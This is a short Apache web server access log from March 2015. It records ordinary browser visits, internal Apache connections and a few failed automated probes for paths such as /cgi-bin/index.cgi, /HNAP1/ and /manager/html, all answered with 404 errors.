66.249.80.42 - - [12/Mar/2015:15:25:47 -0400] "GET / HTTP/1.1" 200 729 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.80.51 - - [12/Mar/2015:15:25:47 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
129.120.2.130 - - [12/Mar/2015:15:40:25 -0400] "GET / HTTP/1.1" 304 173 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.2.130 - - [12/Mar/2015:15:40:25 -0400] "GET /getlist.js HTTP/1.1" 304 173 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.2.130 - - [12/Mar/2015:15:40:25 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.2.131 - - [12/Mar/2015:15:40:35 -0400] "-" 408 0 "-" "-"
129.120.2.131 - - [12/Mar/2015:15:40:35 -0400] "-" 408 0 "-" "-"
129.120.2.131 - - [12/Mar/2015:15:40:36 -0400] "-" 408 0 "-" "-"
93.120.127.134 - - [12/Mar/2015:18:37:56 -0400] "GET / HTTP/1.1" 200 729 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
93.120.127.134 - - [12/Mar/2015:18:37:56 -0400] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 468 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
93.120.127.134 - - [12/Mar/2015:18:37:56 -0400] "GET /HNAP1/ HTTP/1.1" 404 468 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
80.82.64.116 - - [12/Mar/2015:19:36:55 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
222.210.17.133 - - [12/Mar/2015:21:30:28 -0400] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"
222.210.17.133 - - [12/Mar/2015:21:30:28 -0400] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"
::1 - - [12/Mar/2015:21:56:01 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
116.228.70.228 - - [12/Mar/2015:22:24:39 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
::1 - - [12/Mar/2015:22:58:49 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [13/Mar/2015:00:01:28 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
68.185.202.206 - - [13/Mar/2015:01:08:59 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
::1 - - [13/Mar/2015:02:24:25 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
68.185.202.206 - - [13/Mar/2015:02:52:27 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
94.102.49.168 - - [13/Mar/2015:03:30:11 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
68.185.202.206 - - [13/Mar/2015:05:14:39 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
::1 - - [13/Mar/2015:06:36:42 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
211.154.139.85 - - [13/Mar/2015:12:06:14 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
